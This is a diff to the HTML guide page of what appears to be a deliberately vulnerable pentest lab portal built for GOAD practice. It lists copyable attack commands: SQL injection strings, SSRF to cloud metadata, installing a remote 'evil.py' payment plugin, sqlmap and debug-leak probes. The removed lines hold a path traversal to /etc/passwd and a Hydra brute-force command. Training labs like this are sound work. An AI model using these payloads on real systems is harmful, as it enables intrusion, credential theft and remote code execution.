@@ -1100,14 +1298,28 @@ and hidden information that can be used for exploitation.</pre>
         </div>
         <div class="guide-step">
           <div class="guide-step-content">
-            <h4>SQL Injection — Treasury</h4>
-            <div class="guide-cmd">curl -s "http://TARGET/portal/api/treasury/search?q=' OR 1=1--"<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+            <h4>SQL Injection — Shop Search</h4>
+            <div class="guide-cmd">curl -s "http://TARGET/portal/api/shop/items?search=' OR '1'='1"<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
           </div>
         </div>
         <div class="guide-step">
           <div class="guide-step-content">
             <h4>SSRF — Cloud Metadata</h4>
             <div class="guide-cmd">curl -s "http://TARGET/portal/api/avatar/fetch?url=http://169.254.169.254/latest/meta-data/"<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+        <div class="guide-step">
+          <div class="guide-step-content">
+            <h4>Supply Chain — Malicious Plugin</h4>
+            <div class="guide-cmd">curl -s -X POST http://TARGET/portal/api/shop/payment-plugin \
+  -H 'Content-Type: application/json' \
+  -d '{"plugin_url":"https://example.com/evil.py","plugin_name":"evil-gateway"}'<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+          </div>
+        </div>
+        <div class="guide-step">
+          <div class="guide-step-content">
+            <h4>Verbose Error Leak</h4>
+            <div class="guide-cmd">curl -s http://TARGET/portal/api/shop/items/99999/debug | python3 -m json.tool<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
           </div>
         </div>
         <div class="guide-step">
@@ -1120,23 +1332,9 @@ and hidden information that can be used for exploitation.</pre>
         </div>
         <div class="guide-step">
           <div class="guide-step-content">
-            <h4>Path Traversal</h4>
-            <div class="guide-cmd">curl -s "http://TARGET/portal/api/files/download?path=../../../etc/passwd"<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
-          </div>
-        </div>
-        <div class="guide-step">
-          <div class="guide-step-content">
-            <h4>Brute Force with Hydra</h4>
-            <div class="guide-cmd">hydra -l admin -P /usr/share/wordlists/rockyou.txt \
-  TARGET http-post-form \
-  "/portal/api/auth/login:username=^USER^&password=^PASS^:invalid"<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
-          </div>
-        </div>
-        <div class="guide-step">
-          <div class="guide-step-content">
-            <h4>SQLMap — Treasury</h4>
-            <div class="guide-cmd">sqlmap -u "http://TARGET/portal/api/treasury/search?q=test" \
-  --level 3 --risk 2 --batch<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
+            <h4>SQLMap — Shop Items</h4>
+            <div class="guide-cmd">sqlmap -u "http://TARGET/portal/api/shop/items?search=test" \
+  --level 3 --risk 2 --batch --dbms=mssql<button class="copy-btn" onclick="copyCmd(this)">Copy</button></div>
           </div>
         </div>
         <div class="guide-step">
@@ -2237,6 +2435,22 @@ and hidden information that can be used for exploitation.</pre>
 
 })();
 </script>
+
+<!-- ── Disclaimer Footer ─────────────────────────── -->
+<footer class="site-disclaimer">
+  <div class="disclaimer-content">
+    <p class="disclaimer-title">&#9878; Legal Disclaimer</p>
+    <p>This is a <strong>personal educational project</strong> created for cybersecurity training and penetration testing practice.
+    It is built to integrate with <a href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank" rel="noopener">GOAD (Game of Active Directory)</a>,
+    an open-source Active Directory lab by Orange Cyberdefense.</p>
+    <p>"A Song of Ice and Fire" is a novel series by <strong>George R.R. Martin</strong>, published by Bantam Books (Penguin Random House).
+    "Game of Thrones" is a registered trademark of <strong>Home Box Office, Inc. (HBO)</strong>.
+    All character names, locations, and lore referenced herein are the intellectual property of their respective owners.
+    This project uses thematic elements under fair use for non-commercial, educational purposes only.</p>
+    <p>This project has <strong>no affiliation with Oracle Corporation, HBO, George R.R. Martin, or Penguin Random House</strong>.
+    Any reference to Oracle Cloud Infrastructure (OCI) relates solely to the deployment environment used for the lab.</p>
+  </div>
+</footer>
 
 </body>
 </html>
